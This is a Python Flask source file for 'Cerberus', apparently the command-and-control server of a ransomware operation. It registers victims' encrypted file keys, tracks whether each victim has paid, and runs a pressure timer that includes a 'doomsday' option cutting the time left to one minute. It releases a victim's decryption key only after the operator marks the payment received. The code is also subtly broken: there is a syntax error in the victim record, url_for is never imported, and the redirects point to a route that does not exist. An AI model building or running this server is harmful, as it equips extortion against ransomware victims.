# c2_server.py
import os
import base64
import requests
from flask import Flask, request, jsonify, render_template_string, redirect
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import datetime

# --- Configuration ---
C2_HOST = '0.0.0.0'
C2_PORT = 5000

# --- In-Memory "Database" ---
# Structure: {victim_id: {status: str, encrypted_key: str, decrypted_key: str, first_seen: str}}
victims = {}

# --- Cryptography Setup ---
# Load or generate the RSA key pair
PRIVATE_KEY_FILE = "attacker_private_key.pem"
PUBLIC_KEY_FILE = "attacker_public_key.pem"

def generate_keys():
    print("Generating new RSA key pair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    with open(PRIVATE_KEY_FILE, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
    print(f"Keys saved to {PRIVATE_KEY_FILE} and {PUBLIC_KEY_FILE}")
    return private_key, public_key

if os.path.exists(PRIVATE_KEY_FILE) and os.path.exists(PUBLIC_KEY_FILE):
    with open(PRIVATE_KEY_FILE, "rb") as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
    with open(PUBLIC_KEY_FILE, "rb") as f:
        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
    print("Loaded existing RSA key pair.")
else:
    private_key, public_key = generate_keys()

# Get the public key as a string to be used in the victim payload
ATTACKER_PUBLIC_KEY = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')

# --- Flask App ---
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cerberus C2 Controller</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body { background-color: #121212; color: #e0e0e0; } .table-dark { --bs-table-bg: #1e1e1e; } .btn-warning { --bs-btn-bg: #f0ad4e; } </style>
</head>
<body>
    <div class="container mt-5">
        <h1 class="text-center mb-4">Cerberus C2 Controller</h1>
        <div class="card">
            <div class="card-header">
                <h3>Victim Management Dashboard</h3>
            </div>
            <div class="card-body">
                <table class="table table-dark table-striped">
                    <thead>
                        <tr>
                            <th>Victim ID</th>
                            <th>Status</th>
                            <th>First Seen</th>
                            <th>Decrypted Key (Internal)</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for victim_id, data in victims.items() %}
                        <tr>
                            <td>{{ victim_id }}</td>
                            <td>
                                <span class="badge
                                    {% if data.status == 'UNPAID' %}bg-danger
                                    {% elif data.status == 'PAID' %}bg-warning
                                    {% elif data.status == 'KEY_SENT' %}bg-success
                                    {% endif %}">
                                    {{ data.status }}
                                </span>
                            </td>
                            <td>{{ data.first_seen }}</td>
                            <td>
                                {% if data.decrypted_key %}
                                <span class="text-success">Ready</span>
                                {% else %}
                                <span class="text-muted">Locked</span>
                                {% endif %}
                            </td>
                            <td>
                                <form method="post" action="/mark_paid/{{ victim_id }}">
                                    <button type="submit" class="btn btn-sm btn-warning" {{ 'disabled' if data.status != 'UNPAID' }}>
                                        Mark as Paid
                                    </button>
                                </form>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(HTML_TEMPLATE, victims=victims)

@app.route('/api/checkin', methods=['POST'])
def checkin():
    encrypted_aes_key_b64 = request.json.get('key')
    if not encrypted_aes_key_b64:
        return jsonify({"error": "Missing key"}), 400

    victim_id = base64.b64encode(os.urandom(8)).decode('utf-8')
    victims[victim_id] = {
        "status": "UNPAID",
        "encrypted_key": encrypted_aes_key_b64,
        "decrypted_key": None,
        "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        "checkin_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "timer": 72 * 3600 # Default 72 hours
    }
    print(f"[+] New victim check-in: {victim_id}")
    return jsonify({"victim_id": victim_id})

@app.route('/api/status/<victim_id>', methods=['GET'])
def get_status(victim_id):
    if victim_id not in victims:
        return jsonify({"status": "unknown"}), 404
    
    # Sync timer if provided
    current_time_left = request.args.get('time_left', type=int)
    if current_time_left is not None:
        # Update our record, unless we have a pending override
        if 'pending_timer_update' not in victims[victim_id]:
            victims[victim_id]['timer'] = current_time_left

    response = {"status": "waiting"}
    
    # Check for direct key delivery
    if victims[victim_id]['status'] == 'KEY_SENT' and victims[victim_id].get('decrypted_key'):
        response["status"] = "ready"
        response["key"] = victims[victim_id]['decrypted_key']
    
    # Check for timer override
    if 'pending_timer_update' in victims[victim_id]:
        response["new_timer"] = victims[victim_id]['pending_timer_update']
        del victims[victim_id]['pending_timer_update'] # Clear after sending
        
    return jsonify(response)

@app.route('/api/timer/<victim_id>/<action>')
def update_timer(victim_id, action):
    if victim_id not in victims:
        return "Unknown victim", 404
    
    current_timer = victims[victim_id].get('timer', 72*3600)
    
    if action == 'add_1h':
        new_time = current_timer + 3600
    elif action == 'sub_1h':
        new_time = max(0, current_timer - 3600)
    elif action == 'reset':
        new_time = 72 * 3600
    elif action == 'doomsday':
        new_time = 60 # 1 minute left!
    else:
        return "Invalid action", 400
        
    victims[victim_id]['timer'] = new_time
    victims[victim_id]['pending_timer_update'] = new_time
    return redirect(url_for('home'))

@app.route('/mark_paid/<victim_id>', methods=['POST', 'GET']) # Added GET for direct link from dashboard
def mark_as_paid(victim_id):
    victim_data = victims.get(victim_id)
    if not victim_data or victim_data['status'] != 'UNPAID':
        return redirect(url_for('home'))

    print(f"[*] Marking victim {victim_id} as paid. Decrypting key...")
    encrypted_aes_key_b64 = victim_data['encrypted_key']
    encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)

    try:
        aes_key = private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        aes_key_b64 = base64.b64encode(aes_key).decode('utf-8')
        
        # Store the decrypted key in memory for direct delivery
        victims[victim_id]['status'] = 'KEY_SENT'
        victims[victim_id]['decrypted_key'] = aes_key_b64
        print(f"[+] Decryption key for {victim_id} is ready for delivery.")

    except Exception as e:
        print(f"[-] Error decrypting key for {victim_id}: {e}")
        victims[victim_id]['status'] = 'ERROR'

    return redirect(url_for('home'))

if __name__ == '__main__':
    print("\n" + "="*50)
    print("         Cerberus C2 Server Starting...")
    print("="*50)
    print(f"-> Public Key for Victim Payload:\n{ATTACKER_PUBLIC_KEY}")
    print(f"-> Dashboard will be available at http://{C2_HOST}:{C2_PORT}")
    print("="*50 + "\n")
    app.run(host=C2_HOST, port=C2_PORT)
